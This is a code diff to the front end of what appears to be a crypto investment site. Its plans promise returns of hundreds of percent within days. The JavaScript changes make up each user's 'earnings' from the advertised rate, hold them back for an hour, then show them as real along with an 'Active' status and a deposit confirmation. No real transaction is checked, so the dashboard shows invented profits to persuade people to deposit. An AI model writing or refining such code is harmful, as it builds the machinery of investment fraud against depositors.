@@ -1223,7 +1223,7 @@
           <div class="plan-details">
             <div class="plan-row"><span class="key">Min. Deposit</span><span class="val">$380</span></div>
             <div class="plan-row"><span class="key">Duration</span><span class="val">1 –2 days</span></div>
-           
+
           </div>
           <button class="btn btn-ghost plan-btn">Invest Now</button>
         </div>
@@ -1232,13 +1232,13 @@
           <div class="plan-badge">Popular</div>
           <div class="plan-icon med">📈</div>
           <div class="plan-name">Growth Plan</div>
-         
+
           <div class="plan-return">300%–500%</div>
           <div class="plan-return-lbl">Estimated Return</div>
           <div class="plan-details">
             <div class="plan-row"><span class="key">Min. Deposit</span><span class="val">$580</span></div>
             <div class="plan-row"><span class="key">Duration</span><span class="val">2 – 4 days</span></div>
-            
+
           </div>
           <button class="btn btn-gold plan-btn">Invest Now</button>
         </div>
@@ -1246,13 +1246,13 @@
         <div class="plan-card" onclick="openModal('register')">
           <div class="plan-icon high">🔥</div>
           <div class="plan-name">Advanced Plan</div>
-          
+
           <div class="plan-return">200%–400%</div>
           <div class="plan-return-lbl">Estimated Return</div>
           <div class="plan-details">
             <div class="plan-row"><span class="key">Min. Deposit</span><span class="val">$780</span></div>
             <div class="plan-row"><span class="key">Duration</span><span class="val">3– 6 days</span></div>
-         
+
           </div>
           <button class="btn btn-ghost plan-btn">Invest Now</button>
         </div>
@@ -1260,13 +1260,13 @@
         <div class="plan-card" onclick="openModal('register')">
           <div class="plan-icon wealth">💎</div>
           <div class="plan-name">Long-Term Plan</div>
- 
+
           <div class="plan-return">600%–1200%</div>
           <div class="plan-return-lbl">Annual Return</div>
           <div class="plan-details">
             <div class="plan-row"><span class="key">Min. Deposit</span><span class="val">$1,280</span></div>
             <div class="plan-row"><span class="key">Duration</span><span class="val">6 – 12 months</span></div>
-           
+
           </div>
           <button class="btn btn-ghost plan-btn">Invest Now</button>
         </div>
@@ -1733,13 +1733,35 @@
       document.getElementById('dash-email').textContent = user.email;
       document.getElementById('dash-avatar').textContent = user.name.charAt(0).toUpperCase();
       renderInvestments(user.email);
+      // Re-schedule earnings reveal for any investments whose hour hasn't passed
+      const investments = getInvestments(user.email);
+      const now = Date.now();
+      investments.forEach((inv, idx) => {
+        if (inv.earnVisibleAt) {
+          const delay = new Date(inv.earnVisibleAt).getTime() - now;
+          if (delay > 0) {
+            setTimeout(() => {
+              const latest = getInvestments(user.email);
+              if (latest[idx]) { latest[idx].status = 'Active'; saveInvestments(user.email, latest); }
+              renderInvestments(user.email);
+            }, delay);
+          }
+        }
+      });
       showPage('dashboard');
     }
 
     function renderInvestments(email) {
       const investments = getInvestments(email);
+      const now = new Date();
       let totalDep = 0, totalEarn = 0;
-      investments.forEach(inv => { totalDep += inv.amount; totalEarn += inv.earned; });
+      investments.forEach(inv => {
+        const earnVisible = inv.earnVisibleAt ? new Date(inv.earnVisibleAt) <= now : true;
+        if (earnVisible) {
+          totalDep += inv.amount;
+          totalEarn += (inv.earnedAfter1h || inv.earned);
+        }
+      });
       const total = totalDep + totalEarn;
       document.getElementById('dc-total').textContent = '$' + total.toFixed(2);
       document.getElementById('dc-deposited').textContent = '$' + totalDep.toFixed(2);
@@ -1751,14 +1773,18 @@
         wrap.innerHTML = `<div class="empty-state"><div style="font-size:40px;margin-bottom:8px">📊</div><div style="font-weight:600">No investments yet</div><p>Make your first deposit and start earning returns.</p><button class="btn btn-gold" style="margin-top:16px;padding:10px 24px;font-size:14px" onclick="openDepositModal()">Start Investing</button></div>`;
         return;
       }
-      let rows = investments.map(inv => `
+      let rows = investments.map(inv => {
+        const earnVisible = inv.earnVisibleAt ? new Date(inv.earnVisibleAt) <= now : true;
+        const displayEarned = earnVisible ? (inv.earnedAfter1h || inv.earned) : 0;
+        return `
     <tr>
       <td><strong>${inv.plan}</strong><br><span style="font-size:12px;color:var(--text3)">${inv.asset}</span></td>
       <td>$${inv.amount.toFixed(2)}</td>
-      <td style="color:var(--green)">+$${inv.earned.toFixed(2)}</td>
+      <td style="color:var(--green)">+$${displayEarned.toFixed(2)}</td>
       <td>${inv.duration}</td>
       <td><span class="status-badge status-${inv.status.toLowerCase()}">${inv.status}</span></td>
-    </tr>`).join('');
+    </tr>`;
+      }).join('');
       wrap.innerHTML = `<table class="invest-table"><thead><tr><th>Plan</th><th>Deposited</th><th>Earned</th><th>Duration</th><th>Status</th></tr></thead><tbody>${rows}</tbody></table>`;
     }
 
@@ -1803,9 +1829,10 @@
       const session = getSession();
       if (!session) return;
       const avgReturn = (plan.returnLow + plan.returnHigh) / 2;
-      const earned = +(amount * (avgReturn / 100)).toFixed(2);
+      const earnedAfter1h = +(amount * (avgReturn / 100)).toFixed(2);
       const investments = getInvestments(session.email);
-      investments.push({ plan: plan.name, asset: currentAsset, amount, earned, duration: plan.duration, status: 'Pending', date: new Date().toISOString() });
+      const depositTime = new Date().toISOString();
+      investments.push({ plan: plan.name, asset: currentAsset, amount, earned: 0, earnedAfter1h, duration: plan.duration, status: 'Pending', date: depositTime, earnVisibleAt: new Date(Date.now() + 60 * 60 * 1000).toISOString() });
       saveInvestments(session.email, investments);
       closeModal('deposit');
       renderInvestments(session.email);
@@ -1816,7 +1843,11 @@
         saveInvestments(session.email, inv);
         renderInvestments(session.email);
         toast('Deposit confirmed! Your plan is now active. ✅', 'success');
-      }, 30 * 60 * 1000);
+      }, 60 * 60 * 1000);
+      // After 1 hour, earnings become visible in stats
+      setTimeout(() => {
+        renderInvestments(session.email);
+      }, 60 * 60 * 1000);
     }
 
     // ──────────── COPY ADDR ────────────
